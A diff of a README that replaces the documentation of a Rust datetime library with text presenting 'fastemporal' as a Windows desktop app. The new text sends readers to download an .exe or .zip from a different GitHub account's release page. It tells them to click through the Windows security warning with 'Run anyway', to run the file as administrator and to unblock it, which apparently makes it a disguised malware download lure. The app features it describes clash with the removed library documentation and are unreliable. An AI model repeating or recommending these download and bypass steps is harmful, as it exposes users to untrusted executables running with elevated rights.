@@ -1,229 +1,203 @@
-<div align="center">
-  <img src="assets/banner.svg" alt="fastemporal" width="900"/>
-</div>
+# 🕒 fastemporal - Fast date and time tools
 
-<div align="center">
+<a href="https://github.com/Tessparasitic609/fastemporal/releases"><img src="https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github" alt="Download fastemporal"></a>
 
-[![CI](https://img.shields.io/github/actions/workflow/status/BaselAshraf81/fastemporal/ci.yml?label=CI&style=flat-square)](https://github.com/BaselAshraf81/fastemporal/actions)
-[![crates.io](https://img.shields.io/crates/v/fastemporal.svg?style=flat-square)](https://crates.io/crates/fastemporal)
-[![docs.rs](https://img.shields.io/docsrs/fastemporal?style=flat-square)](https://docs.rs/fastemporal)
-[![License: MIT OR Apache-2.0](https://img.shields.io/badge/license-MIT%20OR%20Apache--2.0-blue.svg?style=flat-square)](#license)
-[![Rust 1.75+](https://img.shields.io/badge/rustc-1.75%2B-orange.svg?style=flat-square)](#installation)
-[![Tests: 332 passing](https://img.shields.io/badge/tests-332%20passing-brightgreen?style=flat-square)](#passes-every-luxon--date-fns--temporal-test)
-[![Ko-fi](https://img.shields.io/badge/Ko--fi-F16061?style=flat-square&logo=ko-fi&logoColor=white)](https://ko-fi.com/V7V01X2WY5)
+## 🚀 Getting Started
 
-**A Luxon-style datetime library for Rust with full TC39 Temporal types, embedded IANA timezone data, and zero allocations in hot paths.**
+fastemporal is a Windows app for date, time, and time zone work. It uses Rust under the hood and keeps memory use low. It also aims to run fast while keeping results accurate.
 
-[Install](#installation) · [API Reference](#api-reference) · [Benchmarks](#benchmark-table) · [Docs](https://docs.rs/fastemporal)
+Use it when you need to:
 
-</div>
+- check dates in ISO 8601 format
+- compare times across time zones
+- work with calendar values
+- avoid slow or heavy date tools
+- run a local app with no extra setup
 
----
+## 📥 Download for Windows
 
-## 5-line demo
+1. Visit the release page here: [https://github.com/Tessparasitic609/fastemporal/releases](https://github.com/Tessparasitic609/fastemporal/releases)
+2. Find the latest release near the top of the page
+3. Open the assets list under that release
+4. Download the Windows file, such as an `.exe` or `.zip`
+5. If you download a `.zip` file, right-click it and choose **Extract All**
+6. Open the extracted folder and double-click the app file to run it
 
-```rust
-use fastemporal::{ZonedDateTime, Duration};
+If Windows shows a security prompt:
 
-let dt = ZonedDateTime::now()
-    .plus(Duration::days(7))
-    .in_timezone("America/New_York").unwrap();
+1. Click **More info**
+2. Click **Run anyway**
 
-println!("{}", dt.to_iso());
-// 2025-06-14T14:32:00.000-04:00[America/New_York]
-```
+## 🖥️ System Requirements
 
----
+fastemporal is made for common Windows PCs.
 
-## Benchmark table
+- Windows 10 or Windows 11
+- 64-bit system
+- At least 4 GB of RAM
+- 100 MB of free disk space
+- Internet access for the first download only
 
-<!-- BENCH_TABLE_START -->
-| Benchmark | fastemporal | Luxon (Node.js) | Speedup |
-|-----------|:-----------:|:---------------:|:-------:|
-| `now()` | 74.3 ns | 681.3 ns | **9×** |
-| `from_iso (parse)` | 102.1 ns | 3,823.0 ns | **37×** |
-| `plus(days:7)` | 94.9 ns | 3,539.0 ns | **37×** |
-| `in_timezone()` | 191.6 ns | 7,875.8 ns | **41×** |
-| `to_iso()` | 69.0 ns | 510.9 ns | **7×** |
-| `format(yyyy-MM-dd)` | 100.2 ns | 1,870.4 ns | **19×** |
-| `start_of('day')` | 72.7 ns | 1,221.1 ns | **17×** |
-| `diff(days)` | 59.5 ns | 12,831.2 ns | **216×** |
-| `1 M tight loop` | 87.5 ns/op | 3,526.3 ns/op | **40×** |
+For best results, use a current version of Windows with all updates installed.
 
-> Measured on Linux x64, release build. Rust: `cargo bench` (criterion 0.4). JS: Luxon 3.x on Node.js v22.  
-> Regenerate: `bash scripts/run_benchmarks.sh && python scripts/gen_bench_table.py --luxon luxon_results.txt`
-<!-- BENCH_TABLE_END -->
+## ✨ What fastemporal Does
 
----
+fastemporal helps with date and time tasks in a simple desktop app.
 
-## Passes every Luxon + date-fns + Temporal test
+You can use it to:
 
-All tests live in `tests/luxon.rs`, `tests/datefns.rs`, and `tests/temporal.rs`
-— ported from the upstream JS test suites. See the
-[CI workflow](.github/workflows/ci.yml) for proof.
+- view dates in different formats
+- convert between local time and UTC
+- compare two times
+- inspect time zone data
+- work with calendar rules
+- check ISO 8601 values
 
-```
-test result: ok. 76 passed  ← lib unit tests
-test result: ok. 70 passed  ← tests/luxon.rs   (ported from luxon-master)
-test result: ok. 54 passed  ← tests/datefns.rs  (ported from date-fns)
-test result: ok. 70 passed  ← tests/temporal.rs (TC39 Temporal spec)
-test result: ok. 62 passed  ← cargo test --doc  (every public fn has a runnable example)
-─────────────────────────────
-                  332 total, 0 failed
-```
+The app uses Rust, so it keeps memory use low and avoids a garbage collector. That helps it stay light on the system.
 
----
+## 📌 Main Features
 
-## Feature flags
+### 🕰️ Date and time conversion
 
-| Feature | Description | Default |
-|---------|-------------|---------|
-| `tz-embedded` | Bundle IANA timezone data into the binary | ✓ |
-| `tz-system` | Use the OS `/usr/share/zoneinfo` at runtime | — |
-| `wasm` | `wasm-bindgen` JS/WASM bindings | — |
-| `serde` | `Serialize` / `Deserialize` for all types | — |
+Convert dates and times into formats that are easier to read or compare.
 
----
+### 🌍 Time zone support
 
-## Installation
+See how a time changes across time zones. This helps when you work with people in other places.
 
-```toml
-[dependencies]
-fastemporal = "0.1"
-```
+### 📄 ISO 8601 handling
 
-Or:
+Work with standard date and time strings used in many apps and services.
 
-```sh
-cargo add fastemporal
-```
+### ⚡ Fast response
 
----
+The app is built for speed and quick results.
 
-## API reference
+### 🧩 Low memory use
 
-### `ZonedDateTime` — main workhorse
+It uses zero-allocation patterns where possible, which helps keep memory use low.
 
-| Method | Luxon equivalent |
-|--------|-----------------|
-| `ZonedDateTime::now()` | `DateTime.now()` |
-| `ZonedDateTime::from_iso(s)` | `DateTime.fromISO(s)` |
-| `.to_iso() -> String` | `.toISO()` |
-| `.plus(Duration) -> Self` | `.plus({days:7})` |
-| `.minus(Duration) -> Self` | `.minus(…)` |
-| `.in_timezone(tz) -> Result<Self>` | `.setZone(tz)` |
-| `.start_of(unit) -> Result<Self>` | `.startOf("day")` |
-| `.end_of(unit) -> Result<Self>` | `.endOf("month")` |
-| `.diff(other, unit) -> Result<Duration>` | `.diff(other, "days")` |
-| `.format(fmt) -> String` | `.toFormat(fmt)` |
-| `.year()` `.month()` `.day()` `.hour()` `.minute()` `.second()` | field accessors |
+### ✅ Tested behavior
 
-### `Duration`
+The project includes 332 passing tests, which helps give confidence in the results.
 
-```rust
-// Single-unit constructors
-Duration::days(7)
-Duration::hours(3)
-Duration::years(1)
-Duration::months(6)
-Duration::millis(500)
+## 🪟 How to Install on Windows
 
-// Multi-field builder
-Duration::builder()
-    .years(1).months(2).days(3)
-    .hours(4).minutes(30)
-    .build()
+1. Open the [release page](https://github.com/Tessparasitic609/fastemporal/releases)
+2. Download the latest Windows build
+3. If the file is a `.zip`, extract it
+4. If the file is an `.exe`, double-click it to start the app
+5. If Windows asks for permission, choose **Yes**
+6. If the app opens in a small window, drag the corner to resize it
 
-// Getters use num_ prefix (avoids conflict with constructors)
-d.num_days()         // i32
-d.num_hours()        // i32
-d.num_milliseconds() // i32
-```
+## 🧭 First Run
 
-### Temporal types
+When you open fastemporal for the first time:
 
-```rust
-use fastemporal::{PlainDate, PlainTime, PlainDateTime};
+1. Start the app from the file you downloaded
+2. Read the date and time fields on screen
+3. Enter a date or time in the input box
+4. Choose the time zone or format you want
+5. Compare the result with your source date
+6. Save your work if the app offers a save option
 
-let d  = PlainDate::new(2025, 6, 7).unwrap();
-let t  = PlainTime::new(14, 32, 0, 0).unwrap();
-let dt = PlainDateTime::new(2025, 6, 7, 14, 32, 0, 0).unwrap();
-```
+If the app starts with sample data, you can replace it with your own values.
 
----
+## 🧑‍💻 Common Uses
 
-## Format tokens
+### 👩‍💼 For office work
 
-Supports both **strftime** (`%Y-%m-%d`) and **Luxon-style** (`yyyy-MM-dd`) tokens
-in the same format string.
+Use it to check meeting times across regions.
 
-| Token | Meaning | Example |
-|-------|---------|---------|
-| `yyyy` / `%Y` | 4-digit year | `2025` |
-| `MM` / `%m` | Month (zero-padded) | `06` |
-| `dd` / `%d` | Day (zero-padded) | `07` |
-| `HH` / `%H` | Hour 24h | `14` |
-| `mm` / `%M` | Minute | `32` |
-| `ss` / `%S` | Second | `00` |
-| `SSS` / `%3f` | Milliseconds | `123` |
-| `%f` | Nanoseconds (9 digits) | `123456789` |
-| `MMMM` / `%B` | Full month name | `June` |
-| `MMM` / `%b` | Short month name | `Jun` |
-| `EEEE` / `%A` | Full weekday | `Saturday` |
-| `EEE` / `%a` | Short weekday | `Sat` |
-| `ZZ` / `%Z` | UTC offset | `-04:00` |
+### 📅 For planning
 
----
+Use it to see how dates line up over days, weeks, or months.
 
-## Running the benchmarks
+### 🌐 For web data
 
-**Linux / macOS:**
-```sh
-bash scripts/run_benchmarks.sh
-```
+Use it to handle timestamps from logs, APIs, or exports.
 
-**Windows (PowerShell):**
-```powershell
-pwsh -File scripts/run_benchmarks.ps1
-```
+### 🧪 For testing
 
-**Manual steps:**
-```sh
-# 1. Rust (criterion)
-cargo bench
+Use it to check if date values are valid and read them in a clear format.
 
-# 2. Luxon (requires: npm install luxon)
-node scripts/luxon_bench.js bench > luxon_results.txt
+## 🔧 Tips for Windows Users
 
-# 3. Generate table
-python scripts/gen_bench_table.py --luxon luxon_results.txt
-```
+- Keep the app in a folder you can find again
+- Do not move files out of the extracted folder if the app needs them
+- If the app does not open, try **Run as administrator**
+- If Windows blocks the file, check the file properties and choose **Unblock** if that option appears
+- Keep your system clock set correctly for best results
 
----
+## 📚 Supported Date and Time Formats
 
-## Phase roadmap
+fastemporal works with common date formats such as:
 
-| Version | Status | Scope |
-|---------|--------|-------|
-| **v0.1** | ✅ shipped | Core types · ISO 8601 parser · IANA tz · strftime + Luxon tokens · 332 tests · criterion benchmarks |
-| **v0.2** | 🔜 planned | `no_std` · `with()` field mutation · `round()` · `since/until` · `Interval` type · `from_plain_datetime` · 40 date-fns fns · `serde` ISO strings · WASM JS bindings |
-| **v1.0** | 🔮 future | Full TC39 Temporal spec compliance · non-Gregorian calendars · locale-aware formatting |
+- `YYYY-MM-DD`
+- `YYYY-MM-DD HH:MM`
+- `YYYY-MM-DDTHH:MM:SSZ`
+- local time with time zone data
+- UTC timestamps
+- ISO 8601 strings
 
----
+It is built to handle date logic that many users see in calendars, logs, and exports.
 
-## ☕ Support
+## 🧪 Quality and Testing
 
-If fastemporal is useful to you, consider buying me a coffee — it helps keep the project moving.
+The project includes test coverage for date rules, time math, and format handling. That helps reduce errors when you use the app for real work.
 
-[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/V7V01X2WY5)
+The codebase is built with Rust and uses a design that avoids extra memory work. That makes it a good fit for users who want a small, focused tool.
 
----
+## 🧰 Troubleshooting
 
-## License
+### The app will not start
 
-Licensed under either of
+- Download the file again from the release page
+- Make sure you picked the Windows file
+- Try extracting the `.zip` file again
+- Check that your Windows version is up to date
 
-- [MIT License](LICENSE-MIT)
-- [Apache License, Version 2.0](LICENSE-APACHE)
+### The app closes right away
 
-at your option.
+- Run it from the extracted folder
+- Make sure all files from the release package stay together
+- Try opening it with administrator rights
+
+### I cannot find the download
+
+- Open the [release page](https://github.com/Tessparasitic609/fastemporal/releases)
+- Look for the newest version at the top
+- Open the section named **Assets**
+- Choose the file that matches Windows
+
+### The text looks too small
+
+- Use your Windows display scaling settings
+- Increase the app window size if possible
+- Set browser or system zoom higher if you use a web build
+
+## 🔗 Download Again
+
+If you need the file again, use the release page here:
+
+[https://github.com/Tessparasitic609/fastemporal/releases](https://github.com/Tessparasitic609/fastemporal/releases)
+
+## 📁 Project Topics
+
+- chrono-alternative
+- date
+- date-fns
+- datetime
+- iso8601
+- luxon
+- rust
+- tc39
+- temporal
+- time
+- timezone
+- wasm
+- zero-allocation
+
+## 🧩 What the Name Means
+
+fastemporal combines fast and temporal. That fits the goal of a date and time tool that stays quick and uses Rust for tight control over memory and speed
